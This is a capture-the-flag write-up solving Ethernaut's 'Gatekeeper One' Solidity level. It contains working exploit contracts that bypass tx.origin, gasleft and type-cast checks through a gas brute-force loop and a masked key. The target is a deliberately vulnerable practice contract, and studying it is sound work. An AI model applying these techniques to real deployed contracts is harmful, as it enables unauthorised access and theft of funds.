# Level 13: Gatekeeper One

This is the level 13 of OpenZeppelin [Ethernaut](https://ethernaut.openzeppelin.com/) web3/solidity based game.

## Pre-requisites
- [Difference between `tx.origin` and `msg.sender`](https://ethereum.stackexchange.com/questions/1891/whats-the-difference-between-msg-sender-and-tx-origin)
- [gasleft](https://docs.soliditylang.org/en/v0.8.3/units-and-global-variables.html#block-and-transaction-properties) function
- Solidity [opcode](https://medium.com/@blockchain101/solidity-bytecode-and-opcode-basics-672e9b1a88c2) basics
- [Explicit Conversion](https://docs.soliditylang.org/en/v0.8.3/types.html#explicit-conversions) between types

## Hack
Given contract:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract GatekeeperOne {

  using SafeMath for uint256;
  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft().mod(8191) == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```

`player` has to pass all `require` checks and set `entrant` to `player` address.

We start with following `GatePassOne` to attack:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract GatePassOne {
    function enterGate(address _gateAddr, uint256 _gas) public returns (bool) {
        bytes8 gateKey = bytes8(tx.origin);
        (bool success, ) = address(_gateAddr).call.gas(_gas)(abi.encodeWithSignature("enter(bytes8)", gateKey));
        return success;
    }
}
```

### gateOne
This is exactly same as level 4. A basic intermediary contract will be used to call `enter`, so that `msg.sender` != `tx.origin`.

### gateTwo
According to this one, the remaining gas just after `gasleft` is called, should be a multiple of 8191. We can control the gas amount sent with transaction using `call`. But it need to be set in such a way that amount set minus amount used up until `gasleft`'s return should be a multiple of 8191.

I'm going to use Remix's Debug feature and a little bit of trial & error to determine the remaining gas up until to that point. But first copy & deploy `GatekeeperOne` in Remix with `JavaScript VM` environment (since trials are quick & Debug on testnet didn't work on Remix for me!), with same solidity compiler version. Also deploy `GateKeeperOneGasEstimate` with same environment, to help with estimating gas used up to that point:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract GateKeeperOneGasEstimate {
    function enterGate(address _gateAddr, uint256 _gas) public returns (bool) {
        bytes8 gateKey = bytes8(uint64(tx.origin));
        (bool success, ) = address(_gateAddr).call.gas(_gas)(abi.encodeWithSignature("enter(bytes8)", gateKey));
        return success;
    }
}
```

Initially choose a random fixed gas amount (but big enough) to send with transaction. Let's say `90000`. And call `enterGate` of `GateKeeperOneGasEstimate` with address of our deployed `GatekeeperOne` (from Remix, not Ethernaut's!) and the chosen gas. Now hit `Debug` button in Remix console against the mined transaction. Focus on left pane.

See the list of opcodes executed corresponding to our contract execution. Step over (or drag progress bar) until the line with `gasleft` is highlighted:
```
289 JUMPDEST
290 PUSH1 ..
292 PUSH2 ..
295 GAS
296 PUSH2
   .
   .
   .
139 RETURN
```
Step here and there to locate the `GAS` opcode which corresponds to `gasleft` call. Proceed just one step more (to `PUSH2` here) and note the "remaining gas" from **Step Detail** just below. In my case it's `89746`. Hence gas used up to that point:

```
gasUsed = _gas - remaining_gas
or, gasUsed = 90000 - 89746
or, gasUsed = 254
```

Now, we have `gasUsed` and we want set a `_gas` such that `gasLeft` returns a multiple of 8191. One such value would be:

```
_gas = (8191 * 8) + gasUsed
or, _gas = (8191 * 8) + 254
or, _gas = 65782
```
(Note that I randomly chose `8` to multiply to 8191, you can choose any as log as sufficient gas is provided for transaction)

So `_gas` should probably be `65782` to pass the check. But, the target `GateKeeperOne` contract (Ethernaut's instance) on Rinkeby network must've had a little bit of different compile time options. So correct `_gas` is not necessarily `65782`, but a close one. Let's pick a reasonable margin around `65782` and call `enter` for all values around `65782` with that margin. A margin of `64` worked for me. Let's update `GatePassOne`:

```solidity
contract GatePassOne {
    event Entered(bool success);

    function enterGate(address _gateAddr, uint256 _gas) public returns (bool) {
        bytes8 key = bytes8(uint64(tx.origin));
        
        bool succeeded = false;

        for (uint i = _gas - 64; i < _gas + 64; i++) {
          (bool success, ) = address(_gateAddr).call.gas(i)(abi.encodeWithSignature("enter(bytes8)", key));
          if (success) {
            succeeded = success;
            break;
          }
        }

        emit Entered(succeeded);

        return succeeded;
    }
}
```

Calling `enterGate` with `GateKeeper` address and `65782`, params should now clear `gateTwo`.

### gateThree

This has checks that involves explicit conversions between `uint`s. It can be inferred from third `require` statement that the `_gateKey` should be extracted from `tx.origin` through casting while satisfying other checks.

`tx.origin` will be the `player` which in my case is:
```
0xd557a44ed144bf8a3da34ba058708d1b4bc0686a
```
We should be concerned with only 8 bytes of it since `_gateKey` is `bytes8` (8 byte size) type. And specifically last 8 bytes of it, since `uint` conversions retain the last bytes.

So, 8 bytes portion (say, `key`) of our interest:
```
key = 58 70 8d 1b 4b c0 68 6a
```

Accordingly, `uint32(uint64(key)) = 4b c0 68 6a`.

To satisfy third `require`, it is needed that:
```
uint32(uint64(key)) == uint16(tx.origin)
or, `4b c0 68 6a = 68 6a
```
which is only possible by masking with `00 00 ff ff` , such that:<br>
```
4b c0 68 6a & 00 00 ff ff = 68 6a
```

So, `mask = 00 00 ff ff`

The first `require` is satisfied by:
```
uint32(uint64(_gateKey)) == uint16(uint64(key)
or, 4b c0 68 6a = 68 6a
```
which is same problem as previous one and can be achieved with same, previous value of `mask`.

The second `require` asks to satisfy:
```
uint32(uint64(key)) != uint64(key)
or, 4b c0 68 6a != 58 70 8d 1b 4b c0 68 6a
```

We modify the mask to:
```
mask = ff ff ff ff 00 00 ff ff
```
so that it satisfies:
```
00 00 00 00 4b c0 68 6a & ff ff ff ff 00 00 ff ff  != 58 70 8d 1b 4b c0 68 6a
```
while also satisfying other two `require`s.

Hence the `_gateKey` should be:
```
_gateKey = key & mask
or, _gateKey = 58 70 8d 1b 4b c0 68 6a & ff ff ff ff 00 00 ff ff
```
Finally, update `GatePassOne` to reflect it.

```solidity
contract GatePassOne {
    event Entered(bool success);

    function enterGate(address _gateAddr, uint256 _gas) public returns (bool) {
        bytes8 key = bytes8(uint64(tx.origin)) & 0xffffffff0000ffff;
        
        bool succeeded = false;

        for (uint i = _gas - 64; i < _gas + 64; i++) {
          (bool success, ) = address(_gateAddr).call.gas(i)(abi.encodeWithSignature("enter(bytes8)", key));
          if (success) {
            succeeded = success;
            break;
          }
        }

        emit Entered(succeeded);

        return succeeded;
    }
}
```

That was quite a level. But victory!

_Learned something awesome? Consider starring the [github repo](https://github.com/theNvN/ethernaut-openzeppelin-hacks)_ 😄

_and following me on twitter [here](https://twitter.com/heyNvN)_ 🙏
